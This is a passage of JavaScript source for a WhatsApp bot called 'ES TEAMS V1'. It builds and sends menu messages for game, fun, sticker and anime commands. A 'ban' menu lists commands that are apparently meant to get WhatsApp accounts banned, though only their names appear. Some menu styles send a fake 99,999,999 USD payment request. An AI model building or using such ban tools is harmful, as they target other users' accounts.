} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'gamemenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐆𝐀𝐌𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}truth 🅕
┃ ${setv} ${prefix}dare 🅕
┃ ${setv} ${prefix}suit 🅕
┃ ${setv} ${prefix}tictactoe 🅕
┃ ${setv} ${prefix}math 🅕
┃ ${setv} ${prefix}playbomb 🅕
┃ ${setv} ${prefix}casino 🅕
┃ ${setv} ${prefix}esteams-riddle 🅞
┃ ${setv} ${prefix}rob 🅕
┃ ${setv} ${prefix}slot 🅕
┃ ${setv} ${prefix}dice 🅕
┃ ${setv} ${prefix}profile 🅕
┃ ${setv} ${prefix}claim 🅕
┃ ${setv} ${prefix}tmoney 🅕
┃ ${setv} ${prefix}tflimit 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'banmenu': {

let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐁𝐀𝐍\` 】❄️━━━━━╮
┃ ${setv} ${prefix}esteams-ban1
┃ ${setv} ${prefix}esteams-ban2
┃ ${setv} ${prefix}esteams-ban3
┃ ${setv} ${prefix}esteams-ban4
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'funmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐅𝐔𝐍\` 】❄️━━━━━╮
┃ ${setv} ${prefix}define 🅕
┃ ${setv} ${prefix}readmore 🅕
┃ ${setv} ${prefix}yomamajoke 🅕
┃ ${setv} ${prefix}fact 🅕
┃ ${setv} ${prefix}couple 🅕
┃ ${setv} ${prefix}soulmate 🅕
┃ ${setv} ${prefix}stupidcheck 🅕
┃ ${setv} ${prefix}handsomecheck 🅕
┃ ${setv} ${prefix}uncleancheck 🅕
┃ ${setv} ${prefix}hotcheck 🅕
┃ ${setv} ${prefix}smartcheck 🅕
┃ ${setv} ${prefix}greatcheck 🅕
┃ ${setv} ${prefix}evilcheck 🅕
┃ ${setv} ${prefix}dogcheck 🅕
┃ ${setv} ${prefix}coolcheck 🅕
┃ ${setv} ${prefix}waifucheck 🅕
┃ ${setv} ${prefix}awesomecheck 🅕
┃ ${setv} ${prefix}gaycheck 🅕
┃ ${setv} ${prefix}cutecheck 🅕
┃ ${setv} ${prefix}lesbiancheck 🅕
┃ ${setv} ${prefix}hornycheck 🅕
┃ ${setv} ${prefix}prettycheck 🅕
┃ ${setv} ${prefix}lovelycheck 🅕
┃ ${setv} ${prefix}uglycheck 🅕
┃ ${setv} ${prefix}pick 🅕
┃ ${setv} ${prefix}esteams-riddle 🅞
┃ ${setv} ${prefix}pickupline 🅕
┃ ${setv} ${prefix}quotes 🅕
┃ ${setv} ${prefix}can 🅕
┃ ${setv} ${prefix}is 🅕
┃ ${setv} ${prefix}when 🅕
┃ ${setv} ${prefix}where 🅕
┃ ${setv} ${prefix}what 🅕
┃ ${setv} ${prefix}how 🅕
┃ ${setv} ${prefix}rate 🅕
┃ ${setv} ${prefix}cry 🅕
┃ ${setv} ${prefix}kill 🅕
┃ ${setv} ${prefix}hug 🅕
┃ ${setv} ${prefix}pat 🅕
┃ ${setv} ${prefix}lick 🅕 
┃ ${setv} ${prefix}kiss 🅕
┃ ${setv} ${prefix}bite 🅕
┃ ${setv} ${prefix}yeet 🅕
┃ ${setv} ${prefix}bully 🅕
┃ ${setv} ${prefix}bonk 🅕
┃ ${setv} ${prefix}wink 🅕
┃ ${setv} ${prefix}poke 🅕
┃ ${setv} ${prefix}nom 🅕
┃ ${setv} ${prefix}slap 🅕
┃ ${setv} ${prefix}smile 🅕 
┃ ${setv} ${prefix}wave 🅕
┃ ${setv} ${prefix}awoo 🅕
┃ ${setv} ${prefix}blush 🅕
┃ ${setv} ${prefix}smug 🅕
┃ ${setv} ${prefix}glomp 🅕 
┃ ${setv} ${prefix}happy 🅕
┃ ${setv} ${prefix}dance 🅕
┃ ${setv} ${prefix}cringe 🅕
┃ ${setv} ${prefix}cuddle 🅕
┃ ${setv} ${prefix}highfive 🅕 
┃ ${setv} ${prefix}handhold 🅕
┃ ${setv} ${prefix}spank 🅕
┃ ${setv} ${prefix}tickle 🅕
┃ ${setv} ${prefix}feed 🅕
┃ ${setv} ${prefix}checkme 🅕
┃ ${setv} ${prefix}sound1 - sound161 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'stickermenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐓𝐈𝐂𝐊𝐄𝐑\` 】❄️━━━━━╮
┃ ${setv} ${prefix}goose 🅕
┃ ${setv} ${prefix}woof 🅕
┃ ${setv} ${prefix}8ball 🅕
┃ ${setv} ${prefix}lizard 🅕
┃ ${setv} ${prefix}meow 🅕
┃ ${setv} ${prefix}gura 🅕
┃ ${setv} ${prefix}telestick 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'animemenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐀𝐍𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}searchanime 🅕
┃ ${setv} ${prefix}animeinfo 🅕
┃ ${setv} ${prefix}animeid 🅕
┃ ${setv} ${prefix}animedl 🅕
┃ ${setv} ${prefix}searchmanga 🅕
┃ ${setv} ${prefix}amv 🅕
┃ ${setv} ${prefix}mangainfo 🅕
┃ ${setv} ${prefix}searchchapter 🅕
┃ ${setv} ${prefix}mangachapter 🅕
┃ ${setv} ${prefix}randommanga 🅕
┃ ${setv} ${prefix}stickhandhold 🅕
┃ ${setv} ${prefix}stickshinobu 🅕
┃ ${setv} ${prefix}stickcuddle 🅕
┃ ${setv} ${prefix}stickhighfive 🅕
┃ ${setv} ${prefix}stickdance 🅕
┃ ${setv} ${prefix}stickcringe 🅕
┃ ${setv} ${prefix}stickhappy 🅕
┃ ${setv} ${prefix}stickglomp 🅕
┃ ${setv} ${prefix}sticksmug 🅕
┃ ${setv} ${prefix}stickblush 🅕
┃ ${setv} ${prefix}stickawoo 🅕
┃ ${setv} ${prefix}stickwave 🅕
┃ ${setv} ${prefix}sticksmile 🅕
┃ ${setv} ${prefix}stickslap 🅕
┃ ${setv} ${prefix}stickpoke 🅕
┃ ${setv} ${prefix}stickwink 🅕
┃ ${setv} ${prefix}stickbonk 🅕
┃ ${setv} ${prefix}stickbully 🅕
┃ ${setv} ${prefix}stickyeet 🅕
┃ ${setv} ${prefix}stickbike 🅕
┃ ${setv} ${prefix}stickkiss 🅕
┃ ${setv} ${prefix}sticklick 🅕
┃ ${setv} ${prefix}stickpat 🅕
┃ ${setv} ${prefix}stickhug 🅕
┃ ${setv} ${prefix}stickkill 🅕
┃ ${setv} ${prefix}stickcry 🅕
┃ ${setv} ${prefix}stickspank 🅕
┃ ${setv} ${prefix}sticktickle 🅕
┃ ${setv} ${prefix}traceanime 🅕
┃ ${setv} ${prefix}akira 🅕
┃ ${setv} ${prefix}akiyama 🅕
┃ ${setv} ${prefix}ana 🅕
┃ ${setv} ${prefix}asuna 🅕
┃ ${setv} ${prefix}ayuzawa 🅕
┃ ${setv} ${prefix}boruto 🅕
┃ ${setv} ${prefix}chiho 🅕
┃ ${setv} ${prefix}chitoge 🅕
┃ ${setv} ${prefix}cosplayloli 🅕
┃ ${setv} ${prefix}cosplaysagiri 🅕
┃ ${setv} ${prefix}deidara 🅕
┃ ${setv} ${prefix}doraemon 🅕
┃ ${setv} ${prefix}elaina 🅕
┃ ${setv} ${prefix}emilia 🅕
┃ ${setv} ${prefix}erza 🅕
┃ ${setv} ${prefix}gremory 🅕
┃ ${setv} ${prefix}hestia 🅕
┃ ${setv} ${prefix}husbu 🅕
┃ ${setv} ${prefix}inori 🅕
┃ ${setv} ${prefix}isuzu 🅕
┃ ${setv} ${prefix}itachi 🅕
┃ ${setv} ${prefix}itori 🅕
┃ ${setv} ${prefix}kaga 🅕
┃ ${setv} ${prefix}kagura 🅕
┃ ${setv} ${prefix}kakasih 🅕
┃ ${setv} ${prefix}kaori 🅕
┃ ${setv} ${prefix}keneki 🅕
┃ ${setv} ${prefix}kotori 🅕
┃ ${setv} ${prefix}kurumi 🅕
┃ ${setv} ${prefix}loli 🅕
┃ ${setv} ${prefix}loli2 🅕
┃ ${setv} ${prefix}madara 🅕
┃ ${setv} ${prefix}megumin 🅕
┃ ${setv} ${prefix}mikasa 🅕
┃ ${setv} ${prefix}mikey 🅕
┃ ${setv} ${prefix}miku 🅕
┃ ${setv} ${prefix}minato 🅕
┃ ${setv} ${prefix}naruto 🅕
┃ ${setv} ${prefix}neko 🅕
┃ ${setv} ${prefix}nekonime 🅕
┃ ${setv} ${prefix}nezuko 🅕
┃ ${setv} ${prefix}onepiece 🅕
┃ ${setv} ${prefix}pokemon 🅕
┃ ${setv} ${prefix}randomnime 🅕
┃ ${setv} ${prefix}randomnime2 🅕
┃ ${setv} ${prefix}rize 🅕
┃ ${setv} ${prefix}sagiri 🅕
┃ ${setv} ${prefix}sakura 🅕
┃ ${setv} ${prefix}sasuke 🅕
┃ ${setv} ${prefix}shina 🅕
